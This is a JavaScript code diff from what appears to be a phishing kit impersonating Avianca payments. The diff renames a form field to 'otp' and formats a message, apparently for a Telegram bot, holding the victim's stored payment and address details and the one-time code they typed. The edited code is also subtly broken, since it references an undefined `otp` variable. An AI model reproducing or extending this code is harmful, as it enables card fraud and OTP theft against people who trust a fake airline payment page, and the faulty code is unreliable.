@@ -9,21 +9,21 @@ document.addEventListener("DOMContentLoaded", () => {
     btnNextStep.addEventListener("click", async (event) => {
         event.preventDefault();
 
-        const dinamicInput = document.getElementById("dinamic");
+        const dinamicInput = document.getElementById("otp");
 
         if (!dinamicInput) {
-            console.error("❌ No se encontró el campo dinamic.");
+            console.error("❌ No se encontró el campo otp.");
             return;
         }
 
         const dinamic = dinamicInput.value.trim();
 
         if (!dinamic) {
-            alert("Por favor, ingresa el código dinamic.");
+            alert("Por favor, ingresa el código otp.");
             return;
         }
 
-        console.log("✅ Código dinamic ingresado:", dinamic);
+        console.log("✅ Código otp ingresado:", otp);
 
         const pagoData = localStorage.getItem("pagoavianca");
         if (!pagoData) {
@@ -63,7 +63,7 @@ document.addEventListener("DOMContentLoaded", () => {
 🏙️ Ciudad: <code>${pagoavianca.city}</code>
 🗽 Provincia: <code>${pagoavianca.state}</code>
 🧭 Dirección: <code>${pagoavianca.address}</code>
-🔑 Dinámica: <code>${dinamic}</code>`;
+🔑 otp: <code>${otp}</code>`;
 
         const keyboard = {
             inline_keyboard: [
